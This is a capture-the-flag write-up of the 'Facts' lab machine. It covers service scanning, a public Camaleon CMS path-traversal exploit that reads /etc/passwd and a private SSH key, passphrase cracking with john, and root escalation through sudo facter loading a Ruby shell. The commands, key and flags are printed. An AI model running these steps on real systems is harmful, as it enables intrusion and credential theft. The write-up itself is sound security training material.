
# CTF Writeup: Facts

---

## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.129.244.96                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 14:16 -0500
Nmap scan report for 10.129.244.96
Host is up (0.018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds
```

An more detailled scan revealed the following information about running services on the server.

```
nmap -n -Pn -sSCV -p 22,80,54321 10.129.244.96
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 14:18 -0500
Nmap scan report for 10.129.244.96
Host is up (0.016s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.244.96:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B6E2ABE704369F
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 07 Jun 2026 19:18:50 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18B6E2ABE704369F</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B6E2A858B4F8A6
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 07 Jun 2026 19:18:35 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18B6E2A858B4F8A6</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Sun, 07 Jun 2026 19:18:35 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.99%I=7%D=6/7%Time=6A25C40B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAcc
SF:ept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20appl
SF:ication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-ag
SF:e=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20d
SF:d9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Am
SF:z-Request-Id:\x2018B6E2A858B4F8A6\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2007\x20Jun
SF:\x202026\x2019:18:35\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encodi
SF:ng=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20
SF:Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Requ
SF:estId>18B6E2A858B4F8A6</RequestId><HostId>dd9025bab4ad464b049177c95eb6e
SF:bf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,59
SF:,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Sun,\x2007\x20J
SF:un\x202026\x2019:18:35\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x20
SF:400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20
SF:303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-T
SF:ransport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\x
SF:20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9
SF:251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018B6E2ABE704369F\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r
SF:\nDate:\x20Sun,\x2007\x20Jun\x202026\x2019:18:50\x20GMT\r\n\r\n<\?xml\x
SF:20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReques
SF:t</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Message
SF:><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>18B6E
SF:2ABE704369F</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd
SF:1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.16 seconds
```

Judging from the detailled nmap scan we know that the unknown port seems to be another webserver which redirects us to an service running on port 9001.

```
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.244.96:9001
```

Upon trying to inspect the service running on 9001, we can't. It's probably running internally on the server.

Upon inspecting the website running on port 80, we can't reach it. It forwards us to an internal domain called "facts.htb". Let's map it to the target ip in our local dns file.

```
echo "10.129.244.96 facts.htb" | tee -a /etc/hosts
```

We manually reviewed the website and found 3 users.

```
bob
carol
dave
```

Enumerated endpoints using "feroxbuster" and retrieved publicly accessible /admin endpoint, which redirected us to /admin/login 

```
feroxbuster --url http://facts.htb           
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://facts.htb/
 🚩  In-Scope Url          │ facts.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      121l      443w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      124l      552w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       69l      448w    30396c http://facts.htb/randomfacts/logopage2.png
200      GET       66l      519w    44082c http://facts.htb/randomfacts/primary-question-mark.png
404      GET        2l        9w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
```

Upon accessing the web panel I used the registration functionality and logged into the CMS it gave me information about the running CMS called "Camaleon CMS" and the version 2.9.0

I searched up for exploits and found out that this version is vulnerable to Path Traversal of CVE-2024-46987.

I cloned the following repository:

```
https://github.com/Goultarde/CVE-2024-46987
```

I ran the exploit locally with the previously created user account and it worked!

```
python3 CVE-2024-46987.py -u http://facts.htb -l saitama -p 'HonorShard302!' -v /etc/passwd
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

Let's check if there is any private ssh keys for user "trivia".

Found it!

```
python3 CVE-2024-46987.py -u http://facts.htb -l saitama -p 'HonorShard302!' -v /home/trivia/.ssh/id_ed25519
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD8WTMovu
Q8r+g6FQWaFJwTAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIB9yLaS7l7thVq6W
93llWFuzty+KZVHE/B3Ny+KTCCVLAAAAoAok0KiFYFHCQhCPQkJ31jeoDouHaallk7dA5M
9A10YJWtIjUpk+CSG+Nvb6ZkE4GbrNyBCp+DwmeTG5VT6I4CGB4E3FDKOcMNzDJfTb99a5
8R8mRccvaYRBZsMFlwJV3LIII3e3c4PTG00MUkbrRmPa0YeG5M/bWD9/oHHnDYlV6A0p1f
Ra/n4vqPGzrD3BHQQcryzpy6cALj8WwoqPO4s=
-----END OPENSSH PRIVATE KEY-----
```

I saved the ssh key locally, but it still wanted an passphrase.

```
ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519':
```

Let's try and somehow get the passphrase. I converted the ssh key into hash using the tool "ssh2john"

```
ssh2john id_ed25519 > hash
```

Bruteforced an passphrase out of the hash.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt           
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Verbosity now 4pending...
0g 0:00:00:43 0.01% (ETA: 2026-06-15 21:21) 0g/s 24.18p/s 24.18c/s 24.18C/s dancer1..morena
dragonballz      (id_ed25519)     
1g 0:00:02:10 DONE (2026-06-07 16:15) 0.007684g/s 24.58p/s 24.58c/s 24.58C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We now have valid credentials for user trivia.

```
trivia:dragonballz
```

Logged into SSH as user "trivia".

```
ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': 
Last login: Wed May 13 13:08:02 UTC 2026 from 10.10.14.3 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jun  7 09:19:07 PM UTC 2026

  System load:           0.08
  Usage of /:            75.0% of 7.28GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.244.96
  IPv6 address for eth0: dead:beef::a0de:adff:fe42:f514


1 update can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$
```

Retrieved users.txt /home/william

```
4517601b5d72009cf9bef293162e7358
```

## Privilege Escalation

Transfered linpeas.sh and ran it.

```
./linpeas.sh
```

Checked sudo permissions for user "trivia" and found out it has sudo permissions with no authentication for the "facter" binary.

```
trivia@facts:/tmp$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```


Searched up on gtfobins for an Priv Esc PoC and found:

It allows us to execute ruby files

Created an directory, since the PoC executes the first .rb file in this directory.

```
cd /tmp
mkdir hi
```

Created an .rb file which executes the bash binary.

```
nano exploit.rb
exec "/bin/bash"
```

Executed the PoC from gtfobins and gained RCE as user "root".

```
trivia@facts:/tmp/hi$ sudo /usr/bin/facter --custom-dir=/tmp/hi/
```

Retrieved root.txt in /root directory.

```
0a1d26f0e3164a6fa2ef7d0a854413a5
```